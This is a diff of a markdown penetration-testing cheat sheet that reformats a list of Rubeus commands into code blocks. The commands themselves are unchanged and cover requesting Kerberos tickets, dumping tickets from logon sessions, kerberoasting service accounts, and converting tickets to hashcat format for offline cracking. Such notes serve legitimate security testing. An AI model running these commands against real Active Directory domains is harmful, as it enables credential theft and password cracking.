@@ -90,18 +90,34 @@
 
 ### TECHNIQUES
 
-#### 1) Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] 
+#### 1) 
 
-#### 2) Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
+    Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] 
 
-#### 3) Rubeus.exe klist [/luid:LOGINID]
+#### 2) 
 
-#### 4) Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+    Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
 
-#### 5) Rubeus.exe triage (List available tickets)
+#### 3) 
 
-#### 6) Rubeus.exe dump /luid:0x12d1f7 (Dump one ticket, the output is in Kirbi format)
+    Rubeus.exe klist [/luid:LOGINID]
 
-#### 7) Rubeus.exe renew /ticket:BASE64_TICKET (Renewing a ticket)
+#### 4) 
 
-#### 8) Rubeus.exe hash /ticket:BASE64_TICKET (Convert a ticket to hashcat format for offline cracking)
+    Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER]
+
+#### 5) 
+
+    Rubeus.exe triage (List available tickets)
+
+#### 6) 
+
+    Rubeus.exe dump /luid:0x12d1f7 (Dump one ticket, the output is in Kirbi format)
+
+#### 7) 
+
+    Rubeus.exe renew /ticket:BASE64_TICKET (Renewing a ticket)
+
+#### 8) 
+
+    Rubeus.exe hash /ticket:BASE64_TICKET (Convert a ticket to hashcat format for offline cracking)
